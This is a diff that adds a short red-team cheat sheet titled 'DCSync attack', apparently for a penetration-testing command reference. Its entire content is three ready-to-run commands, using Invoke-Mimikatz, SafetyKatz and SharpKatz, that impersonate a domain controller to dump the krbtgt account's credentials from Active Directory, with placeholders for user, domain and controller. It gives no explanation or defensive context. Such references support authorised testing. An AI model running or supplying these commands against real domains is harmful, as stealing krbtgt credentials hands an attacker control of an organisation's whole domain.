@@ -1,0 +1,10 @@
+% DCSync attack
+
+# Invoke-Mimikatz
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<krbtgt-user-name>"'
+
+# Safetykatz
+Safetykatz.exe "lsadump::dcsync /user:<krbtgt-user-name>" "exit"
+
+# Sharpkatz
+SharpKatz.exe --Command dcsync --User <domainpart>\krbtgt --Domain <FQDN> --DomainController <dc-hostname>
